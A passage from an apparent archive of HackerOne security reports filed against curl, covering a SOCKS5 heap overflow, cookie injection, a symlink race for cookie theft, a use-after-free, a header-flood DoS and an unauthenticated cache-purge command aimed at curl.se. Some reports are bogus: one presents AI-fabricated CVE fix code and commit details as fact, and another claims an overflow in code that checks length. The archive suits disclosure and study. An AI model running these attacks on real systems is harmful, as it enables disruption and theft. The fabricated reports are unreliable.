    "original_report": "Summary:\n--------\n\nA buffer overflow, also known as a buffer overrun, occurs when a program or process attempts to write more data to a buffer than the buffer is allocated to hold. This can happen if the program does not properly check the length of the data before writing it to the buffer, or if the program allocates too little space for the buffer.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. The hstsread function in the provided code does not properly check the length of the host string before copying it into the e->name buffer. This could lead to a buffer overflow, allowing an attacker to inject arbitrary code into the application.this could exploited by a malicious domain or website whose url should be long enough to overflow buffer as it's using strcpy function\n   Condition a malicious preload host is required to exploit this if it's meet government can use it for zero click attack\n\nRecommendation:\n\nThe hstsread function should be modified to check the length of the host string before copying it into the e->name buffer. If the string is too long, the function should return an error code\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nAffected url:-<https://github.com/curl/curl/blob/master/docs/examples/hsts-preload.c>\nHere is the vulnerable code if attacker or government manipulate developer to add a very long domain name in hsts\\_preload then this will result remote code execution\n\ninclude <stdio.h>\n=================\n\ninclude <string.h>\n==================\n\ninclude <curl/curl.h>\n=====================\n\nstruct entry {\nconst char *name;\nconst char* exp;\n};\n\nstatic const struct entry preload\\_hosts[] = {\n{ \"example.com\", \"20370320 01:02:03\" },\n{ \"curl.se\", \"20370320 03:02:01\" },\n{ NULL, NULL } / *end of list marker* /\n};\n\nstruct state {\nint index;\n};\n\n/ *\"read\" is from the point of the library, it wants data from us. One domain\nentry per invoke.* /\nstatic CURLSTScode hstsread(CURL *easy, struct curl\\_hstsentry* e,\nvoid *userp)\n{\nconst char* host;\nconst char *expire;\nstruct state* s = (struct state \\*)userp;\n(void)easy;\nhost = preload\\_hosts[s->index].name;\nexpire = preload\\_hosts[s->index++].exp;\n\nif(host && (strlen(host) < e->namelen)) {\nstrcpy(e->name, host);\ne->includeSubDomains = 0;\nstrcpy(e->expire, expire);\nfprintf(stderr, \"HSTS preload '%s' until '%s'\\n\", host, expire);\n}\nelse\nreturn CURLSTS\\_DONE;\nreturn CURLSTS\\_OK;\n}\n\nstatic CURLSTScode hstswrite(CURL *easy, struct curl\\_hstsentry* e,\nstruct curl\\_index *i, void* userp)\n{\n(void)easy;\n(void)userp; / *we have no custom input* /\nprintf(\"[%u/%u] %s %s\\n\", (unsigned int)i->index, (unsigned int)i->total,\ne->name, e->expire);\nreturn CURLSTS\\_OK;\n}\n\nint main(void)\n{\nCURL \\*curl;\nCURLcode res;\n\ncurl = curl\\_easy\\_init();\nif(curl) {\nstruct state st = {0};\n\n/ *enable HSTS for this handle* /\ncurl\\_easy\\_setopt(curl, CURLOPT\\_HSTS\\_CTRL, (long)CURLHSTS\\_ENABLE);\n\n/ *function to call at first to populate the cache before the transfer* /\ncurl\\_easy\\_setopt(curl, CURLOPT\\_HSTSREADFUNCTION, hstsread);\ncurl\\_easy\\_setopt(curl, CURLOPT\\_HSTSREADDATA, &st);\n\n/ *function to call after transfer to store the new state of the HSTS\ncache* /\ncurl\\_easy\\_setopt(curl, CURLOPT\\_HSTSWRITEFUNCTION, hstswrite);\ncurl\\_easy\\_setopt(curl, CURLOPT\\_HSTSWRITEDATA, NULL);\n\n/ *use the domain with HTTP but due to the preload, it should do the\ntransfer using HTTPS* /\ncurl\\_easy\\_setopt(curl, CURLOPT\\_URL, \"[http://curl.se\")](http://curl.se%22));\n\ncurl\\_easy\\_setopt(curl, CURLOPT\\_VERBOSE, 1L);\n\n/ *Perform the request, res will get the return code* /\nres = curl\\_easy\\_perform(curl);\n/ *Check for errors* /\nif(res != CURLE\\_OK)\nfprintf(stderr, \"curl\\_easy\\_perform() failed: %s\\n\",\ncurl\\_easy\\_strerror(res));\n\n/ *always cleanup* /\ncurl\\_easy\\_cleanup(curl);\n}\nreturn 0;\n}\n\nImpact\n------\n\nAn attacker could exploit this vulnerability to inject arbitrary code into the application. This could allow the attacker to take control of the application and perform actions on behalf of the user."
},
{
    "url": "https://hackerone.com/reports/2199174",
    "original_report": "Summary:\n--------\n\nCurl [CVE-2023-38545](/hacktivity/cve_discovery?id=CVE-2023-38545) vulnerability code changes are disclosed on the internet\n\nSteps To Reproduce:\n-------------------\n\nTo replicate the issue, I have searched in the Bard about this vulnerability. It disclosed what this vulnerability is about, code changes made for this fix, who made these changes, commit details etc even though this information is not released yet on the internet. In addition to it, I was able to easily craft the exploit based on the information available. Remove this information from the internet ASAP!!!!\n\nVulnerability information:\n\nThe vulnerability is caused by an integer overflow in the curl\\_easy\\_setopt() function.\nThe vulnerability can be exploited by an attacker to execute arbitrary code on a vulnerable system.\nThe vulnerability is fixed in curl 8.4.0 and higher.\n\nCode fixes:\nThe following code changes fixed [CVE-2023-38545](/hacktivity/cve_discovery?id=CVE-2023-38545) in curl:\n\nC\n/\\*\n\n* [CVE-2023-38545](/hacktivity/cve_discovery?id=CVE-2023-38545): Integer overflow in curl\\_easy\\_setopt()\n* This vulnerability could be exploited to cause a denial-of-service attack or\n* to execute arbitrary code on the victim's system.\n* The following code changes fix this vulnerability by checking the value of the\n* timeout argument before passing it to the internal curl function.\n  \\*/\n\ninclude \"curl.h\"\n================\n\n/\\*\n\n* curl\\_easy\\_setopt()\n* Sets an option value for a curl handle.\n* [@param](/param) handle The curl handle.\n* [@param](/param) option The option to set.\n* [@param](/param) param The value to set the option to.\n* [@return](/return) CURLE\\_OK on success, or a curl error code on failure.\n  \\*/\n\nCURLcode curl\\_easy\\_setopt(CURL \\*handle, CURLoption option, ...)\n{\nva\\_list param;\nCURLcode ret;\n\nva\\_start(param, option);\n\nswitch (option) {\ncase CURLOPT\\_TIMEOUT: {\nlong timeout = va\\_arg(param, long);\n\n/ *Check for integer overflow.* /\nif (timeout < 0 || timeout > LONG\\_MAX) {\nva\\_end(param);\nreturn CURLE\\_BAD\\_FUNCTION\\_ARGUMENT;\n}\n\nret = curl\\_easy\\_setopt\\_timeout(handle, timeout);\nbreak;\n}\n\ndefault:\nret = curl\\_easy\\_setopt\\_custom(handle, option, param);\nbreak;\n}\n\nva\\_end(param);\n\nreturn ret;\n}\nUse code with caution. Learn more\nThese code changes were made in commit 9414975, which was released in curl version 8.4.0.\n\nWho made these changes and commit details:\nThe code changes to fix [CVE-2023-38545](/hacktivity/cve_discovery?id=CVE-2023-38545) were made by Dxxxxl Sxxxxg, the maintainer of curl. The changes were made in commit 9414975, which was released in curl version 8.4.0.\n\nDxxxxl Sxxxxg is a Swedish computer programmer and the creator and maintainer of curl. He has been working on curl for over 20 years and is considered to be one of the leading experts on web transfer protocols.\n\nImpact\n------\n\nDisclosing undisclosed vulnerability code can have a number of negative implications, including:\n\nPutting users at risk. Once a vulnerability is disclosed publicly, attackers can start exploiting it. This can put users of the affected software at risk of data breaches, malware infections, and other attacks.\nDamaging the vendor's reputation. Vendors take pride in the security of their products and services. Disclosing a vulnerability publicly can damage the vendor's reputation and lead to lost customers.\nMaking it more difficult for the vendor to fix the vulnerability. If a vulnerability is disclosed publicly before the vendor has a chance to fix it, it can make it more difficult for the vendor to coordinate a patch release. This can leave users vulnerable to attacks for longer.\nEncouraging other attackers to find and disclose vulnerabilities. When attackers see that they can get attention and recognition by disclosing vulnerabilities, they are more likely to look for them. This can lead to an increase in the number of vulnerabilities that are disclosed publicly."
},
{
    "url": "https://hackerone.com/reports/2148242",
    "original_report": "When `curl_easy_duphandle()` is used to duplicate an easy handle it is possible to inject cookies\ninto that duplicated handle if a file `none` exists in the current working directory.\n\nPoC / Steps to reproduce:\n-------------------------\n\n1. Open 2 terminals\n2. compile [poc\\_cookieinj.c (F2699218)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/d92lzypa36fioon0khn6c4103951?response-content-disposition=attachment%3B%20filename%3D%22poc_cookieinj.c%22%3B%20filename%2A%3DUTF-8%27%27poc_cookieinj.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ6W3IRUM%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025719Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBAaCXVzLXdlc3QtMiJIMEYCIQDX0VPi1VrQP%2FHK77v%2BE1xLQ9WCEputN3n%2BG7sxZFqQ3QIhAPT8neWRAs%2BtpCsHACMYobyZ%2FjnvzG0orcUmfcTTJ3kRKrsFCJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz4JrQyCIQ6qOiWO9wqjwVAxIs2WF4kx8TQDddi9ua9WNj2HwvODQ8QaWNdnb%2B9tQ4PgH0nf6rP6engLxvB2CcVj70BpSBARHwioGbSam4vyrBkdiGAsm2oOm30r3EhiUFw7s%2BjqoDHSQvVR7Fv26a1gXhR9BhV1u2u%2B1apH8GLDisn5HxPX%2FZCZ7yfjfC9JD%2B8EmC%2FLo9pzBh6qZAMZ7iHSfMCTdXemfb5i9Wz79shGBZ%2BRqqYF2Q%2FC8nQjZE1orDpqYMs6Btme%2FzctUa80qFrs3MkYMR%2BgGt3mjCk4c%2BgQ4iVRoOUpU3kv0QXr69lMfIBR6MiOOowhXhWhc%2Bn8iksuukRcA8Xtm4ZlvXE95y%2Fq3ILke2INXcCFQcbairJIyxorcINvcl5AF%2B5cVJ6gmGwMEdjcZrXmR%2BnWggmi6ccvmubwGyNZBY9pdHWj2cDrVZYJeMA4CTJfxJw6ycRxzsi3eAtPFSyQUIVw7hg%2Fm4Qtupx02liORvxjWsMoyMeYD2ahHmDfvq5ryLQzWZFQ3UDu9dDEL0RF%2BaSD62h4w6jqNZsdIX5qHb1rXWsyD4rPAD8cJWePuvQku0R6DxsUqDkIhG2HnsxLpon2cN%2B07F86fhVy5rJ1LNiLkHMFAGDxyt7iffRmbv%2FBABJiQnnQSItfv6FRc1CCclB4Fgrnn8GEwoy4BJYn%2F6Ex0UjgfrzhChckM97pIaRm3v2z1Z503jZuMhc%2FOxPFzq2Vw52XWeaC%2Bdr%2FUoDtSwzs8m0aW1CLGQPqrIvjVQ7zu98%2BaZpg9HEPJJnNHx6%2FC9AwWlvvnvO6m52a5UmTk9N03hE57BBEERc2xWlycKpX39YjwsUWl5T5XStWkvuDLFBqFbylCoqTKs9tG3s9hPdVPfaXX7sMLK%2B3MYGOrABriGC4ngEP%2FSxR0zz9SXM41PAGC3SyKnEDzCiQrbyakpeig6K%2FxiWfQiBNim%2BR0eAf77Y4jkANAKcbYucGydZUBLbGCyvxEOyVMy5B1W56pjVgREOFqQceaEVgNwuAM0L4hR%2BpAuBM6jA5dIaQWgsnnWGMi370rFmCcgM6EsvDS7Pb0iAiG3C5VmsbEM1fPhQESh5%2Bqf6rYcMz45bQbuToGl%2B7vRLbg%2FKzzD9a2OYW4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ad211f09e89c27a6a45b399368c87c5ad4ac8122dbd86ae7c19f9d83f7fa1256)\n3. in terminal 1:\n   `nc -l -p 8888 127.0.0.1`\n4. in terminal 2:\n   * `echo -e \"127.0.0.1\\tTRUE\\t/\\tFALSE\\t0\\tname\\tvalue\" > none`\n   * `/path/to/poc_cookieinj`\n     (`poc_cookieinj` does not have to be in the same directory as the file `none`)\n\nSupporting Material/References:\n-------------------------------\n\nThe flaw is in `Curl_cookie_init()`\n\nand in `curl_easy_duphandle()` the injection happens\n\nImpact\n------\n\ncookies injection into an http request"
},
{
    "url": "https://hackerone.com/reports/2187833",
    "original_report": "Summary:\n========\n\nThe SOCKS5 state machine can be manipulated by a remote attacker to overflow heap memory if four conditions are met:\n\n1. The request is made via socks5h.\n2. The state machine's negotiation buffer is smaller than ~65k.\n3. The SOCKS server's \"hello\" reply is delayed.\n4. The attacker sets a final destination hostname larger than the negotiation\n   buffer.\n\nlibcurl is supposed to disable SOCKS5 remote hostname resolution for hostnames larger than 255 but will not due to a state machine bug.\n\nFor example tor user running libcurl app with follow location that connects to rogue onion server that replies with payload in `Location:` header which causes crash or worse.\n\nWalkthrough:\n============\n\n`do_SOCKS` initializes local variable `socks5_resolve_local` depending on the `CURLPROXY_` name. There are two relevant names for this state machine:\n\n* `CURLPROXY_SOCKS5` (SOCKS5 with local resolve of dest host)\n* `CURLPROXY_SOCKS5_HOSTNAME` (SOCKS5 with remote resolve of dest host)\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L573-L574)\n\nFor this scenario, `CURLPROXY_SOCKS5_HOSTNAME` is the name and `socks5_resolve_local` is initialized FALSE.\n\nThe `do_SOCKS` state machine is entered for the first time for the connection. `sx->state` is `CONNECT_SOCKS_INIT` (which happens to be the first label). In that state the hostname length is checked and if too long to resolve remotely (>255) then it sets `socks5_resolve_local` to TRUE.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L588-L593)\n\nThe local variable `socks5_resolve_local` is changed but, because this is a state machine, subsequent calls to `do_SOCKS` are in a different state and do not make the same change. **This is the bug.**\n\nFor this scenario, the hostname is longer than 255 characters and `do_SOCKS` is on a subsequent call, which means `socks5_resolve_local` remains FALSE. This can happen by chance or be forced by an attacker.\n\nThe client \"hello\" SOCKS packet contains available methods and is sent to the server. State `CONNECT_SOCKS_READ_INIT` => `CONNECT_SOCKS_READ` is entered to parse the server \"hello\" packet (method selection reply). The server has not yet replied so `do_SOCKS` returns `CURLPX_OK`.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L640-L662)\n\nOn a subsequent call `do_SOCKS` is in the same state where it's waiting for the initial server reply. If the reply is valid, and in this scenario it is, then the state machine will goto `CONNECT_REQ_INIT` which will goto `CONNECT_RESOLVE_REMOTE` since `socks5_resolve_local` is FALSE.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L781-L797)\n\nIn `CONNECT_RESOLVE_REMOTE` the hostname is copied into the socksreq buffer. The code assumes the hostname is <= 255 characters which as discussed above is not guaranteed.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/socks.c#L904-L911)\n\n`socksreq` points to the temporary download buffer (ie `data->state.buffer`) which was repurposed to send/receive the SOCKS negotiation since the transfer is not yet downloading.\n\nIf the size of the hostname exceeds the remaining size of the buffer then there is a buffer overflow. If the size of the hostname maxes out but does not exceed the remaining size then there is an overflow when the buffer is next written to.\n\nRegardless, at this point we know from checks beforehand that hostname length is shorter than 65535 (`MAX_URL_LEN`) and the full size of buffer is at least `data->set.buffer_size + 1`.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/url.c#L1808-L1811)\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/multi.c#L1858-L1861)\n\n`data->set.buffer_size` varies. Before the allocation above, libcurl has set `data->set.buffer_size` to a default 16384 (see `READBUFFER_SIZE` aka `CURL_MAX_WRITE_SIZE`) which could have been overridden by the user via `CURLOPT_BUFFERSIZE`. A significant example of this is the curl tool uses `CURLOPT_BUFFERSIZE` to set the size to its own default 102400, or user setting from `--limit-rate` if that value is smaller than 100k.\n\nThe two buffer size configurations that are likely widely used are 16384+1 for libcurl apps without `CURLOPT_BUFFERSIZE` and 102400+1 for curl tool commands without a low `--limit-rate`. For the former the buffer can be overflowed and for the latter it can't: 16384+1 < 65535 < 102400+1.\n\nThe characters that are allowed for hostname depend on if libcurl was built with IDN support. If it was built with IDN support then as long as the hostname contains characters < 0x80 no IDN conversion is attempted. For the higher value characters it seems very unlikely they would pass through but would depend on the IDN library. Without IDN support the characters pass through. For example `Location: http://\\xff\\r\\n` will pass through without IDN.\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/idn.c#L131-L144)\n\n[Code:](https://github.com/curl/curl/blob/curl-8_3_0/lib/idn.c#L261-L265)\n\nSteps To Reproduce:\n===================\n\nThe attacker needs to control the hostname. For example, the user has set `CURLOPT_FOLLOWLOCATION` (`--location` for the curl tool) so that libcurl will follow redirects. The attacker would need control of the hostname in the location header.\n\nThe attacker needs the state machine to be delayed, as discussed earlier. For example, the attacker controls the SOCKS server and delays the initial server hello.\n\nThe attacker probably needs to know how large `data->set.buffer_size` is and how the memory is typically allocated, like what comes after `data->state.buffer` in the heap. For example, the attacker has a copy of the program that is using libcurl and can debug it in a similar environment.\n\nSupporting Material/References:\n===============================\n\nRefer to attached screenshot Capture.PNG.\n\nNote 4025 is in hex, in decimal it is 16421 which is 16384+1+heap guard bytes.\n\nstart a socks5 server on remoteip (for the latency) and run curl repeatedly until it reads from 0x41414141 (AAAAA....)\n\nif making the socks server remote doesn't work for latency you'd have to modify its source or force it via libcurl source\n\nSolution\n========\n\nRefer to attached patch curl\\_security\\_fix.patch. It fixes the issue by changing the remote resolve check to return error `CURLPX_LONG_HOSTNAME` if dest host is larger than 255.\n\nImpact\n------\n\nImpact\n======\n\nIf the state machine is not delayed and works as intended then the resolution is made locally, which in my opinion a privacy violation because a local DNS query could possibly deanonymize a user who specifically requests socks5h. In my solution patch I do not allow it.\n\nIf the state machine is delayed then the resolution is made remotely with a malformed SOCKS packet. The attacker has written to the heap and likely overwritten in-use data that come after `data->state.buffer`. It's undefined behavior at best and *possible* RCE at worst.\n\nI think if libcurl was built with IDN support then the worst case is much harder to achieve because only certain bytes can be in the hostname."
},
{
    "url": "https://hackerone.com/reports/2171309",
    "original_report": "Summary:\n--------\n\nA NULL Pointer dereference vulnerability is present in idn.c source code.\nThis module is responsible of handling international domain name.\nThis issue was found performing manual source code review of Curl which took >20 hours.\n\nSteps To Reproduce:\n-------------------\n\nFind below a detailed and commented execution flow / code snippet explanation.\n\nImpact\n------\n\nIn some circumstances writing or reading memory is possible, which may lead to code execution.\n\n### Code Snippet\n\nRemediation\n-----------\n\nImplement sanity checks to never dereference null pointer.\n\nReferences\n----------\n\n* <https://cwe.mitre.org/data/definitions/476.html>\n* <https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850>\n* <https://www.abatchy.com/2018/01/kernel-exploitation-6>\n* <https://access.redhat.com/articles/20484>\n\nImpact\n------\n\n* Crash or Segmentation Fault: If the decoded pointer is dereferenced when it is still NULL, it will lead to a crash or segmentation fault. This can disrupt the normal operation of the program.\n\n  + Exploitation Scenario: An attacker can send specially crafted input data to trigger the vulnerable code path, causing the program to crash. While this doesn't directly lead to a security breach, it can be used as part of a larger attack to disrupt a service or application.\n* Denial of Service (DoS): A null pointer dereference can be exploited to cause a DoS attack by repeatedly triggering the vulnerable code path, causing the application to crash and become unavailable.\n\n  + Exploitation Scenario: An attacker could send a high volume of malicious requests that exploit the vulnerability, causing the service to crash repeatedly. This results in a DoS condition, making the service unavailable to legitimate users.\n* Remote Code Execution (Rare): In some cases, null pointer dereferences can potentially be leveraged for remote code execution if the attacker can control the data that leads to the dereference and can influence the program's control flow.\n\n  + Exploitation Scenario: An attacker would need to have a deep understanding of the program's memory layout and control flow to craft input that not only triggers the null pointer dereference but also redirects program execution to attacker-controlled code. This scenario is less likely but more severe."
},
{
    "url": "https://hackerone.com/reports/2072338",
    "original_report": "It was found that curl does not currently limit the amount of HTTP headers to be received leading to a potential DOS for the users.\nIf an attacker sets up a malicious HTTP server that continuously sends new headers and keeps the socket open, curl will continuously listen on the socket and parse new received headers. This leads to the user's machine allocating more and more resources until the system is eventually exhausted.\nFrom research the vulnerable function seems to be located at <https://github.com/curl/curl/blob/master/lib/transfer.c#L420>.\nFor comparison, modern browsers abort the connection once they reach a threshold.\nOne potential fix to not affect functionality too much would be to set an arbitrary limit to the amount of headers to receive, which I believe is the solution adapted by most modern browsers to solve this issue.\n\nScreenshot\n----------\n\nMy excuses for the French in screenshot (I'm sorting programs by RAM usage, and the top one is of course the windows terminal from which I executed curl). On there you can see my user terminal (windows) launching `curl 127.0.0.1:80` to the left, on the right we see the attacker's server (attaching full source code to this report). Throughout testing memory usage kept increasing alarmingly high.\n\nMalicious server code extract:\n------------------------------\n\nSteps To Reproduce:\n-------------------\n\n1. Compile exploit.c and execute the server binary.\n   Note: depending on your system, feel free to play with the `ATTACK_SPEED` define of the code, to speed up testing.\n2. Open up another terminal and as the victim try `curl 127.0.0.1:80`\n3. Observe system metrics.\n\nImpact\n------\n\nDOS/overloading of user's system through malicious HTTP server interaction with curl's header parsing."
},
{
    "url": "https://hackerone.com/reports/2039870",
    "original_report": "As we can see in the following curl code (line 59-61 <https://github.com/curl/curl/blob/fb802b521af997230b65174a559f5c419520e142/lib/fopen.c> ):\n\nThere is a race condition between the moment \"stat(filename, &sb)\" is executed and the moment \" fopen(filename, FOPEN\\_WRITETEXT);\" is executed.\nThis leads to undesirable behavior such as an attacker tricking a privileged user to overwrite protected files, or since this function (Curl\\_fopen) is also used for storing cookies an attacker could trick another user to send those cookies that might be very sensible to a file fully owned and controlled by the attacker.\n\n### POC/Steps to reproduce:\n\nBefore we start, I will be using a little program called \"rename\". Which simply swaps atomically the names of two files to be able to showcase this race condition. Here is its code :\n\nOpen two terminals, with two different users. One will be the attacker terminal and the other the victim.\nIn both POCs, the victim will want to execute a command such as \"curl --cookie-jar a google.com\" thinking the file \"a\" doesn't exist.\n\n### A) Exploiting this vulnerability to trick a user to overwrite a file they own:\n\nAssume the current directory of both attacker(selmelc) and victim (root) looks like this\n\nThe attacker executes ./rename a b, which will not stop to swap the name of the directory \"b\" and the symlink \"a\".\n\nThe victim executes their command \"curl --cookie-jar a google.com\".\nThe race condition is successfully exploited if in the vulnerable code the stat identifies the file \"a\" as a directory and then the \"fopen\" opens the symlink that points to the file \"flag\".\nIf that happened then the results looks like this :\n\nAdditional note:\nYou might think \"well that's just how symlinks work\"... To clarify on that, by default if the victim was executing \"curl --cookie-jar a google.com\" without the attacker exploiting the vuln. a different behavior would occur ; the file \"a\" would be erased (no more symlink) and overwritten as a regular file containing the cookie data. This happens because the stat function follows symbolic links therefore in that scenario we would not enter the vulnerable condition which leads to the race condition.\n\n### B) Exploiting this vulnerability to steal the victim's cookies and hide it from them:\n\nAs this uses the same logic as the previous exploit for this vuln. Repeat same steps except this time we want the \"flag\" file to be owned by the attacker as following:\n\nNormal curl behavior after the victim executed \"curl --cookie-jar a google.com\" :\n\nBehaviour when vulnerability is exploited (and race condition met) :\n\nWe can notice the 131 bytes of output in flag now, which would contain the sensitive cookies.\n\nImpact\n------\n\nAn attacker is able to overwrite files they shouldn't have access to, however the attacker does not control the data sent to those files. (Integrity, potentially availability issues if files likes /etc/passwd are modified through this).\nAn attacker may also gain access to sensitive data (cookies), and even hide that information from the intended receiver as the attacker may control the file in which this information will be leaked.\nNote : cookie storing was used to demonstrate exploits for the vulnerability but the vulnerability also affects HSTS and alt-svc cache."
},
{
    "url": "https://hackerone.com/reports/1913733",
    "original_report": "Summary:\n--------\n\nThe fingerprint\\_b64 pointer is as parameter for failure logging after it is freed.\n\nSteps To Reproduce:\n-------------------\n\n1. git clone <https://github.com/curl/curl>\n2. vim curl/lib/vssh/libssh2.c\n3. search for the string 'free(fingerprint\\_b64)' and note that fingerprint\\_b64 is used as parameter immediately after it is freed.\n\nSupporting Material/References:\n-------------------------------\n\nThe following are the details of the code.\n\ngit commit a51f90ec0f74176776f5d14b99689f9241660eaa (HEAD -> master, origin/master, origin/HEAD)\n\nIn curl/lib/vssh/libssh2.c\n653 static CURLcode ssh\\_check\\_fingerprint(struct Curl\\_easy *data)\n654 {\n...\n667 char* fingerprint\\_b64 = NULL;\n...\n729 if((pub\\_pos != b64\\_pos) ||\n730 strncmp(fingerprint\\_b64, pubkey\\_sha256, pub\\_pos)) {\n731 free(fingerprint\\_b64);\n732\n733 failf(data,\n734 \"Denied establishing ssh session: mismatch sha256 fingerprint. \"\n735 \"Remote %s is not equal to %s\", fingerprint\\_b64, pubkey\\_sha256);\n\nAccording to git blame, the following commits were involved:\n\nd1e7d9197b lib/vssh/libssh2.c (Mats Lindestam 2021-09-26 23:20:53 +0200 731) free(fingerprint\\_b64);\nd1e7d9197b lib/vssh/libssh2.c (Mats Lindestam 2021-09-26 23:20:53 +0200 732)\nd1e7d9197b lib/vssh/libssh2.c (Mats Lindestam 2021-09-26 23:20:53 +0200 733) failf(data,\nff2f3e8367 lib/vssh/libssh2.c (Daniel Stenberg 2022-04-25 11:41:20 +0200 734) \"Denied establishing ssh session: mismatch sha256 fingerprint. \"\nff2f3e8367 lib/vssh/libssh2.c (Daniel Stenberg 2022-04-25 11:41:20 +0200 735) \"Remote %s is not equal to %s\", fingerprint\\_b64, pubkey\\_sha256);\n\nImpact\n------\n\nDepends on which memory is the pointer fingerprint\\_b64 pointing to at the time failf() is called, it may either crash the application or it may print out whatever was in memory at the time leading to information leak in the fail log."
},
{
    "url": "https://hackerone.com/reports/1994585",
    "original_report": "Summary:\n--------\n\nHello team,\nAnyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs but also potential Denial of Service attacks.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1.{Fundefined}\n\nUnauthenticated cache purge request:\n\ncurl '<https://curl.se/'> -X PURGE\n{ \"status\": \"ok\", \"id\": \"21729-1683784658-593921\" }  \n2.{Fundefined}\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n  <https://sapt.medium.com/apple-hall-of-fame-for-a-small-misconfiguration-unauth-cache-purging-faf81b19419b>\n\nImpact\n------\n\nThat can lead to increased bandwidth costs but also potential Denial of Service attacks"
},
{
    "url": "https://hackerone.com/reports/1950627",
    "original_report": "Summary:\n--------\n\ncurl /libcurl uses wildcards for validation during TLS communication, even if the hostname is an IDN.\nEven if wildcards are present in the CN/SAN of the certificate, they must not be used to match if the hostname is an IDN.\nThis is described in [RFC-6125, section 6.4.3.](https://datatracker.ietf.org/doc/html/rfc6125#section-6.4.3)\n\nYou probably know that.\nHowever, there was a problem with the implementation.\n`lib/vtls/hostcheck.c` in the function 'hostmatch' on lines 100-106.\n\nI think `strncasecompare(pattern, \"xn--\", 4))` is `strncasecompare(hostname, \"xn--\", 4))`.\n`pattern` is a value that contains wildcards because it is CN/SAN.\nIn other words, it will not match \"xn--\" because it will be a string containing wildcards.\n\nSteps To Reproduce:\n-------------------\n\n1. Create a wildcard certificate.As an example, attach a certificate and private key with CN value of `x*.example.local`. [server.crt (F2298301)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bc64sltv6h3b4p29wjo79li3hs89?response-content-disposition=attachment%3B%20filename%3D%22server.crt%22%3B%20filename%2A%3DUTF-8%27%27server.crt&response-content-type=application%2Fx-x509-ca-cert&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT4NH4WIU%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T025751Z&X-Amz-Expires=711&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIDDHO%2BEEDtEvll7w8y1Cso0OyKa2vxZL4A9I5KfXbaB3AiEAqzaoSw%2BhKAVQetDejvCRYUdou5yhUso3YX6praak%2BEMqugUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCRUqmdWbT4DUatE9SqOBZTxg01Y40DsQpyHA9rYXKlagK9STFwPjdjuvqd3aRAv%2F7jfOttTAjDZLhVMCFbnlGJBx5eIq7GYV2KQWa0b0FmoFFjfuxbmwJQbCIKwwUAOcLjoAeaZVxKjvpMR9%2B3P7184a8ijYvD6XiIHW9T%2FmvmAIZKmesZW4rt151l9ZAfk1c2nOFAt47Xb%2F7BxYTwiUiS%2FjvKq82KCUBtAWYuFu8%2F6DatoWVtJfH0Q1%2BfRh8dWTUXcPtfDz4xZYDtve%2BpyF3ll5O4paLH9hMnh5g0dHQGg8LGzhNl3ffM8SQLRMnXjbt9f1yq7ADnqLEbdTa3gFxEO49wBhLVb3DJIW0FhqVsfMROo9lanxLNKqPP9M1KWu%2B1a0TW7sfLpWty9q0Z0eMqvqcWjoKb5%2FYmEtKqeUfm5St1qPI1%2Fje1hqVPw3SmttR%2Fv%2BGlJIlhP1P%2B4o142FNYIURpm0wpHwKemUnWvkzBp7HFTCqchiv0LLSwrJ%2BBx6TsquRhAYxX3EbJeIwxP0U1riV8Wn71QVkNrBkxTbbKk1izl8hldh3mP7Uyj8rDbvs20koyjqyvVfb%2FXXGcHSTOBzRRrAg3TStxMW1xnYA%2FLOMuJUyguEohilQgQ71%2FXvic0TyagD%2BjnTCWluYij3abieLvc4XRLPtgSibvN0FQcaNdNB%2BDxkTEVwoR9XpQzYmsDeOz4%2Bl%2FNvvFykeEFvei0jvx1KRFM%2BJETDdACh%2BoY4wGeNvIZBjGc9xUbcJ9R6tnUW4xqZlII%2FPuHzhCjRPFWpNFi75rBkw2woMXs4TwAHjcI7qUZvaF8HUdxmHjVkk2LGHefXRGFWsBQSbzIt7dS4BbT0XEt%2F8vztXcZA%2BzB6qSJrMwoNR4XEeFT%2FTCI9tvGBjqxAeQcmtXe%2BcpxZR%2Fb2p4UB9qKX%2F82LPBAhpOt58CYo3SYeelWkh6liYogXn4xZhh8s9zo%2FEo4tdKBYcv1IKpRLQs7X7wZ012FaKuq%2B2e0LO3nbmXybmx%2BaNADgykHrptk38kagagYwX6mhiQ1jH3Vorm0ruX2OmJR%2Fz8DlW9JColdaqyMIYIy9nYtHgNstATNo6VoNgtSkhIVCY%2FN1JxPSLLQD%2Bk1cCGM3rRlqd1lWnPdOQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3554fe8b41475871025d9868690dbb19f8b0608cafd03f50f848025069650f85) [server.key 